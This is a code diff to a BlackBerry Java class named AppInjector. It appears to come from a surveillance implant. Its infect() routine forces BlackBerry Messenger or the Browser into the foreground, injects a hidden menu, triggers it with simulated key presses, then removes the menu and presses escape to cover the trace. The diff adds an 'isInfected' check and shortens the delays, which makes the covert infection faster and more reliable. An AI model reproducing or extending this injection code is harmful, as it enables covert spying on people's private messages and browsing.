@@ -7,6 +7,7 @@ import blackberry.agent.im.AppInjectorBBM;
 import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
 public class AppInjector {
@@ -40,13 +41,14 @@ public class AppInjector {
     }
 
     int type = 0;
+
     public boolean callMenuByKey() {
         //#ifdef DEBUG
         debug.trace("callMenu");
         //#endif
 
         final int foregroundProcess = manager.getForegroundProcessId();
-        
+
         // debug.trace("searching Messenger or Browser");
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
         for (int i = 0; i < apps.length; i++) {
@@ -77,8 +79,18 @@ public class AppInjector {
         //#ifdef DEBUG
         debug.trace("callInContext");
         //#endif
-        delegate.callMenuInContext();
 
+        //#ifdef DBC
+        Check.requires(delegate != null, "callMenuInContext: null delegate");
+        //#endif
+
+        if (delegate.isInfected()) {
+            delegate.callMenuInContext();
+        } else {
+            //#ifdef DEBUG
+            debug.error("callMenuInContext: not infected");
+            //#endif
+        }
     }
 
     public void infect() {
@@ -86,22 +98,22 @@ public class AppInjector {
         debug.trace("infect");
         //#endif
         int req = requestForeground();
-        Utils.sleep(500);
+        Utils.sleep(100);
         boolean fore = checkForeground();
-        
+
         if (fore) {
-            Utils.sleep(500);
+            Utils.sleep(100);
             delegate.injectMenu();
-            Utils.sleep(500);
+            Utils.sleep(100);
             callMenuByKey();
-            Utils.sleep(500);
+            Utils.sleep(100);
             delegate.deleteMenu();
-            Utils.sleep(500);
+            Utils.sleep(100);
 
             if (req == 2 && checkForeground()) {
-                KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);             
-                KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);                
-                
+                KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);
+                KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+
             }
         }
     }
@@ -115,7 +127,7 @@ public class AppInjector {
 
                 if (foregroundPin == processId) {
                     return true;
-                }else{
+                } else {
                     return false;
                 }
             }
@@ -145,7 +157,6 @@ public class AppInjector {
 
             }
         }
-       
 
         return 0;
     }
